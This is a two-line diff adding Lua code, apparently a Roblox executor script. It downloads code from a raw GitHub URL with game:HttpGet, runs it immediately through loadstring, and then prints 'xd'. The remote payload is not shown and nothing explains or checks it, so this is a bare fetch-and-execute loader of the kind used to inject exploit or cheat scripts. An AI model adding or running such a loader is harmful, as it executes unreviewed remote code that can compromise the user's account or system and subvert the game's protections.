@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jackthething/yes/main/testtt'))()
+print("xd")
